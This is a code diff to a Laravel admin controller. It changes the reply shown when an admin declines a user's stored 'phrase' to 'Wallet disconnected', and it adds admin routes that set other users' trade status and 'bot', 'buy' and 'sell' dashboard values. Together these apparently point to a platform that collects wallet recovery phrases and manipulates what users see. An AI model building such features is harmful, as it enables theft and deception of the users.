@@ -568,13 +568,18 @@ class AdminController extends Controller
         $user->update(['phrase' => $updatedPhraseJson]);
 
         // Redirect back with a success message
-        return back()->with('success', $status == 1 ? 'Phrase Approved Successfully' : 'Phrase Declined');
+        return back()->with('success', $status == 1 ? 'Phrase Approved Successfully' : 'Wallet disconnected');
     }
 
 
-    public function updateTrade(Request $request)
+    public function updateTrade(Request $request, $id)
     {
-        $user = Auth::user();
+        $user = User::findOrFail($id);
+
+        // Check if the user is authenticated
+        if (!$user) {
+            return redirect()->back()->withErrors('Invalid User.');
+        }
 
         // Validate action input
         $request->validate([
@@ -583,9 +588,9 @@ class AdminController extends Controller
 
         // Update the user's trade status based on the action
         if ($request->input('action') === 'activate') {
-            $user->trade = true;
+            $user->trade = 1;
         } elseif ($request->input('action') === 'deactivate') {
-            $user->trade = false;
+            $user->trade = 0;
         }
 
         $user->save();
@@ -593,4 +598,24 @@ class AdminController extends Controller
         // Redirect or return a response
         return redirect()->back()->with('success', 'Trade status updated successfully!');
     }
+
+    public function updateUserDash(Request $request, $id)
+    {
+
+        // dd($request->all());
+        $user = User::findOrFail($id);
+        
+        // Store bot, buy, and sell as JSON in the user_trade column
+        $user->user_trade = json_encode([
+            'bot' => $request->input('bot') ? $request->input('bot') : 0,
+            'buy' => $request->input('buy') ? $request->input('buy') : 0,
+            'sell' => $request->input('sell') ? $request->input('sell') : 0,
+        ]);
+
+        // Save the user with updated trade settings
+        $user->save();
+
+        return redirect()->back()->with('success', 'Trade options updated successfully!');
+    }
+
 }
